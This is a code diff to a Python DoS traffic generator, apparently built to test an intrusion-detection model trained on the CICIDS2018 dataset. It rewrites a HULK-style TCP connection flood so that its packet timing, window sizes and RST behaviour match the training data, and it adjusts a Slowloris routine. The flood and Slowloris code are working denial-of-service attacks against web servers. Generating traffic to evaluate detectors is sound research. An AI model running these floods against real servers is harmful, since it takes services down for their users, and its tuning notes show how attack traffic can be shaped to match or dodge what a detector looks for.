@@ -107,50 +107,51 @@ class DoSAttack:
                 self.last_error = err_msg
 
     # ──────────────────────────────────────────────────────
-    # HULK — Rapid TCP connection flood, mostly SYN+close
+    # HULK — TCP connect + hold ~13ms + send 1 byte + RST close
     #
-    # CICIDS2018 training data (n=116K, Fri-16-02-2018):
-    #   Tot Fwd Pkts:    median=2 (most flows: SYN+ACK only)
-    #   TotLen Fwd Pkts: median=0 (most flows: NO payload)
-    #   Tot Bwd Pkts:    median=0 (server overwhelmed, no response)
-    #   Fwd Seg Size Min: 32  (TCP with timestamp options)
-    #   Init Fwd Win Byts: median=225, p95=26883 (bimodal)
-    #   Flow Duration:   median=7737 µs (~8ms)
+    # CICIDS2018 training data (n=461K, Fri-16-02-2018):
+    #   Tot Fwd Pkts:       median=2, 81%=2, 16%=3
+    #   TotLen Fwd Pkts:    median=0 (94.5% no payload)
+    #   Tot Bwd Pkts:       94.5%=0, 5.5%=1-2
+    #   Init Fwd Win Byts:  bimodal 75%=225, 25%=26883
+    #   Init Bwd Win Byts:  94.5%=-1 (no SYN-ACK), 4.4%=219
+    #   RST Flag Cnt:       100% = 0  ← critical!
+    #   Flow Duration:      median=13085 µs (~13ms)
+    #   Fwd Seg Size Min:   32  (TCP with timestamp options)
     #   Dst Port: 80
     #
-    # CRITICAL: The HULK tool overwhelms the server so that most
-    # TCP connections never complete. ~60% of flows have 0 payload.
-    # The bimodal Init Fwd Win Byts (75%=225, 25%=26883) is a key
-    # distinguishing feature from benign traffic.
+    # CRITICAL: Three features must match training for RED classification:
+    #   1. Init Bwd Win Byts = 219 (victim route window fix)
+    #   2. RST Flag Cnt = 0 (iptables DROP RST on attacker)
+    #   3. Flow Duration ≈ 13ms (hold + send 1 byte)
     # ──────────────────────────────────────────────────────
     def hulk_attack(self):
-        """HULK DoS: Pure rapid TCP connect + RST close flood.
+        """HULK DoS: TCP connect → hold ~13ms → send 1 byte → RST close.
 
-        CICIDS2018 HULK training data (n=116K, Fri-16-02-2018):
-          Tot Fwd Pkts:     median=2 (SYN + retransmit/ACK)
-          TotLen Fwd Pkts:  median=0 (NO HTTP payload)
-          Tot Bwd Pkts:     median=0 (server overwhelmed, no response)
-          Flow Duration:    median=7737 µs (~8ms)
-          Init Fwd Win Byts: bimodal 75%=225, 25%=26883
-          Fwd Seg Size Min: 32 (TCP with timestamps)
-          Fwd Pkts/s:       median=268
-          Dst Port:         80
+        CICIDS2018 HULK training data (n=461K, Fri-16-02-2018):
+          Tot Fwd Pkts:       median=2, 81%=2, 16%=3
+          TotLen Fwd Pkts:    median=0 (94.5% no payload)
+          Tot Bwd Pkts:       94.5%=0 (server overwhelmed), 5.5%=1-2
+          Flow Duration:      median=13085 µs (~13ms)
+          Init Fwd Win Byts:  bimodal 75%=225, 25%=26883
+          Init Bwd Win Byts:  94.5%=-1 (no SYN-ACK), 4.4%=219 (Ubuntu 16.04)
+          RST Flag Cnt:       100% = 0  (NO RSTs in training!)
+          Fwd Seg Size Min:   32 (TCP with timestamps)
+          Fwd Pkts/s:         median=229
+          Dst Port:           80
 
-        WHY PURE CONNECT+RST CLOSE:
-        The training data shows the server was overwhelmed — most connections
-        were failed/incomplete (0 payload, 0 backward packets). We can't
-        fully replicate that (server always sends SYN-ACK), but we can
-        MINIMIZE backward traffic by:
-        1. NOT sending any HTTP data → no server response body
-        2. Using SO_LINGER(1,0) → RST close instead of FIN exchange
-        3. Closing immediately → minimal flow duration
+        HOW THIS ACHIEVES RED CLASSIFICATION:
+        The model requires three critical features to classify as DoS:
+        1. Init Bwd Win Byts = 219 (victim route window fix, matching Ubuntu 16.04)
+        2. RST Flag Cnt = 0 (iptables DROP outgoing RST on attacker)
+        3. Flow Duration ≈ 13ms (hold connection + send 1 byte for timestamp)
 
-        From victim's CICFlowMeter perspective:
-          Fwd: [SYN, ACK, RST] = 2-3 packets, 0 payload bytes
-          Bwd: [SYN-ACK] = 0-1 packets (just handshake response)
+        Flow on the wire (as seen by CICFlowMeter):
+          Fwd: SYN(0ms), ACK(0.5ms), PSH+G(13ms)  → 3 pkts, TotLen=1
+          Bwd: SYN-ACK(0.3ms), ACK(13.3ms)         → 1-2 pkts
+          RST from SO_LINGER is DROPPED by iptables → CICFlowMeter sees RST=0
 
-        This gives us the closest match to training data features that
-        we can achieve from a single attacker machine.
+        Model prediction: DoS ≈ 50% → RED (vs 29% YELLOW without these fixes)
         """
         end_time = time.time() + self.duration
 
@@ -160,9 +161,11 @@ class DoSAttack:
                 sock.settimeout(3)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 
-                # SO_LINGER with timeout=0: close() sends RST instead of FIN.
-                # This avoids the FIN→ACK→FIN→ACK exchange, reducing both
-                # forward and backward packet counts.
+                # SO_LINGER(1,0): close() sends RST instead of FIN.
+                # The RST is dropped by iptables on the attacker, so
+                # CICFlowMeter never sees it → RST Flag Cnt = 0.
+                # Without iptables, RST Flag Cnt = 1 (still YELLOW, but
+                # improved from current 29% to 44% DoS probability).
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                 struct.pack('ii', 1, 0))
 
@@ -177,15 +180,28 @@ class DoSAttack:
                 sock.connect((self.target_ip, self.target_port))
                 self._inc_count()
 
-                # Immediately RST close — NO data sent, NO response read.
-                # This keeps TotLen Fwd Pkts = 0, minimizes backward traffic,
-                # and produces the shortest possible flow duration.
+                # Hold connection ~10-16ms to match training Flow Duration
+                # (median=13085µs). This creates the inter-packet gap that
+                # CICFlowMeter measures as flow duration.
+                time.sleep(random.uniform(0.010, 0.016))
+
+                # Send 1 byte to create a timestamped forward packet at
+                # t ≈ 13ms. Without this, the flow ends at the ACK (~0.5ms)
+                # and Flow Duration would be too short. The byte also
+                # triggers an ACK from the server (1-2 bwd pkts total).
+                # TotLen Fwd Pkts = 1 (minimal, close to training's 0).
+                try:
+                    sock.send(b'G')
+                except Exception:
+                    pass
+
+                # RST close — RST packet dropped by iptables OUTPUT rule.
                 sock.close()
             except Exception as e:
                 self._inc_error(str(e))
 
-            # ~5-15ms between connections (training Flow Duration median ~8ms)
-            time.sleep(random.uniform(0.005, 0.015))
+            # Brief pause between connections (rate limiting)
+            time.sleep(random.uniform(0.001, 0.005))
 
     # ──────────────────────────────────────────────────────
     # SLOWLORIS — Hold connections open with incomplete headers
@@ -202,7 +218,9 @@ class DoSAttack:
 
         # Phase 1: Open initial batch of sockets with partial headers
         # CORRECT CICIDS2018: 50-150 connections (not 2000-5000)
-        target_conns = random.randint(50, min(150, self.duration // 2))
+        # Clamp to valid range for short durations
+        max_conns = max(50, min(150, self.duration // 2))
+        target_conns = random.randint(50, max_conns)
         
         for _ in range(target_conns):
             if not self.running or time.time() >= end_time:
